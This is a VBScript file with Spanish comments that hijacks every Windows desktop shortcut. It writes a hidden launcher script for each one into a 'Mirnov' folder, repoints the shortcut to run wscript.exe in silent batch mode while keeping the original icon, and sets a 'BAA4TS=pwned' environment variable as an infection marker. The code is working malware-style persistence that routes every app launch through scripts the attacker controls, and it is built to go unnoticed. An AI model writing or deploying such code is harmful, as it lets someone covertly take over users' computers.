' FILE: swap.vbs
Option Explicit

'##############################################################################
'# DESCRIPCIÓN: Reemplaza accesos directos con VBS numerados usando ejecutable como icono
'# AUTOR: baa4ts
'# FECHA: 2025
'##############################################################################

'##############################################################################
'# DECLARACIÓN DE VARIABLES
'##############################################################################
Dim objFSO, objShell, objFolder, objFile, objShortcut
Dim strDesktop, strMirnov, strVBSPath
Dim originalTarget, ts, vbsName
Dim origArgs, origWorkingDir, origDescription
Dim i, wscriptPath, vbsContent
Dim processedCount, cleanIconPath
Dim segundaParte
Dim Tercera
'##############################################################################
'# INICIALIZACIÓN DE OBJETOS
'##############################################################################
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

'##############################################################################
'# CONFIGURACIÓN DE RUTAS
'##############################################################################
strDesktop = objShell.SpecialFolders("Desktop")
strMirnov = objFSO.BuildPath(strDesktop, "Mirnov")

'##############################################################################
'# PREPARACIÓN DE EJECUCIÓN
'##############################################################################
wscriptPath = objShell.ExpandEnvironmentStrings("%SystemRoot%\System32\wscript.exe")
Set objFolder = objFSO.GetFolder(strDesktop)
i = 1
processedCount = 0

'##############################################################################
'# PROCESAMIENTO DE ACCESOS DIRECTOS
'##############################################################################
If objShell.Environment("User")("BAA4TS") = "" Then
    For Each objFile In objFolder.Files
        If LCase(objFSO.GetExtensionName(objFile.Name)) = "lnk" Then
            
            '======================================================================
            ' OBTENER PROPIEDADES DEL ACCESO DIRECTO
            '======================================================================
            On Error Resume Next
            Set objShortcut = objShell.CreateShortcut(objFile.Path)
            originalTarget = objShortcut.TargetPath
            origArgs = objShortcut.Arguments
            origWorkingDir = objShortcut.WorkingDirectory
            origDescription = objShortcut.Description
            On Error GoTo 0
    
            If originalTarget <> "" Then
                
                '==================================================================
                ' LIMPIAR RUTA DE ICONO (ELIMINAR COMILLAS E ÍNDICES)
                '==================================================================
                cleanIconPath = originalTarget
                cleanIconPath = Replace(cleanIconPath, """", "")
                If InStr(cleanIconPath, ",") > 0 Then
                    cleanIconPath = Left(cleanIconPath, InStr(cleanIconPath, ",") - 1)
                End If
                
                '==================================================================
                ' CREAR ARCHIVO VBS NUMERADO
                '==================================================================
                Do
                    vbsName = CStr(i) & ".vbs"
                    strVBSPath = objFSO.BuildPath(strMirnov, vbsName)
                    i = i + 1
                Loop While objFSO.FileExists(strVBSPath)
    
                ' Primera parte agregar instrucciones para abrir la aplicacion
                vbsContent = "Set WshShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
                             "WshShell.Run """"""" & originalTarget & "" & origArgs & """"""", 1, False" & vbCrLf
                
                ' Segunda parte agregar variables de path
                segundaParte = vbCrLf & "strDesktop = WshShell.SpecialFolders(""Desktop"")" & vbCrLf & _
                            "strMirnov = strDesktop & ""\Mirnov"""
    
                Set ts = objFSO.CreateTextFile(strVBSPath, True)
                ts.Write vbsContent & segundaParte & Tercera
                ts.Close
    
                '==================================================================
                ' MODIFICAR ACCESO DIRECTO
                '==================================================================
                objShortcut.TargetPath = wscriptPath
                objShortcut.Arguments = "//B """ & strVBSPath & """"
                objShortcut.WorkingDirectory = origWorkingDir
                objShortcut.Description = origDescription
                objShortcut.IconLocation = cleanIconPath
                objShortcut.Save
                
                processedCount = processedCount + 1
            End If
        End If
    Next

    ' Variable
    objShell.Run "cmd /c setx BAA4TS pwned", 0, True
End If

'##############################################################################
'# FINALIZACIÓN DEL SCRIPT
'##############################################################################
Set objShortcut = Nothing
Set objFolder = Nothing
Set objShell = Nothing
Set objFSO = Nothing
